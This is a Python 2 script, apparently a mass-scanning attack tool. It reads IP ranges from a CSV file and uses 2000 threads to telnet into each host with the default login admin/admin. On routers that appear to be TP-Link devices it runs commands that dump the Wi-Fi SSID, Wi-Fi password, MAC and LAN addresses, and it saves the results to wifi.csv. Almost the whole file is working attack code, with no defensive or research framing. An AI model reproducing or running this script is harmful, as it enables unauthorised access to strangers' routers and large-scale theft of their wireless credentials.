# coding=utf-8
import threading
import Queue
import time
import os
import csv
import telnetlib
import random

username = "admin"
password = "admin"
tn = 2000 #线程数和队列大小
lk = threading.Lock() #线程锁，在取队列时使用
fk = threading.Lock() #文件锁，在写入wifi信息时使用，确保完整写入一行
qu = Queue.Queue(tn) #ip地址队列，将ip动态加入到队列中，节省内存


def ip2num(ip): #将ip地址转换为数字
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num): #将数字转换为ip地址
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8, num & 0x000000ff)


class bThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SSID = ""
        self.Key = ""
        self.IPRouters = ""
        self.IPInterfaceIPAddress = ""
        self.X_TPLINK_MACAddress = ""

    def run(self):
        while True:
            if lk.acquire():
                self.ip = qu.get()
                lk.release()
            try:
                TIMEOUT = 8+(random.random()*0.4)
                tn = telnetlib.Telnet(self.ip, timeout=TIMEOUT)
                tn.read_until("username:", TIMEOUT)
                tn.write(username + "\n")
                tn.read_until("password:", TIMEOUT)
                tn.write(password + "\n")
                tn.read_until("#", TIMEOUT)
                tn.write("wlctl show\n")
                wlctl = tn.read_until("cmd:SUCC", TIMEOUT)
                tn.write("lan show info\n")
                laninfo = tn.read_until("cmd:SUCC", TIMEOUT)
                tn.close()

                for l in wlctl.split():
                    if l.startswith("SSID="):
                        self.SSID = l[5:]
                    elif l.startswith("Key="):
                        self.Key = l[4:]

                for l in laninfo.split():
                    if l.startswith("IPRouters="):
                        self.IPRouters = l[10:]
                    elif l.startswith("IPInterfaceIPAddress="):
                        self.IPInterfaceIPAddress = l[21:]
                    elif l.startswith("X_TPLINK_MACAddress="):
                        self.X_TPLINK_MACAddress = l[20:]

                if self.SSID != "" and self.Key != "":
                    if fk.acquire():
                        with open('wifi.csv', 'ab') as f:
                            writer = csv.writer(f, dialect='excel')
                            writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                             self.ip, self.SSID, self.Key, self.X_TPLINK_MACAddress,
                                             self.IPRouters, self.IPInterfaceIPAddress))
                        fk.release()

            except:
                continue


if __name__ == "__main__":
    count = 0
    t1 = time.time()
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1))

    for i in xrange(tn):
        bThread().start()

    t2 = time.time()
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2))

    with open('ip.csv', 'rb') as f:
        reader = csv.reader(f, delimiter=',', quotechar='"')
        for row in reader:
            print ": ".join(row[1:4]).decode("gbk")
            for num in range(ip2num(row[1]), ip2num(row[2]) + 1):
                if num & 0xff:
                    qu.put(num2ip(num))
            count = count + ip2num(row[2]) + 1 - ip2num(row[1])
            print "已处理 " + str(count) + " 个ip；每分钟处理 %.2f"%(count / (time.time() - t2) * 60) + " 个ip"

    t3 = time.time()
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t3))

    while True:
        if qu.empty():
            time.sleep(3600)
            break

    t4 = time.time()
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t4))

    with open('timelog.txt', 'wb') as f:
        # noinspection PyTypeChecker
        f.write([time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1)),
                 time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2)),
                 time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t3)),
                 time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t4))])

    os._exit(0)
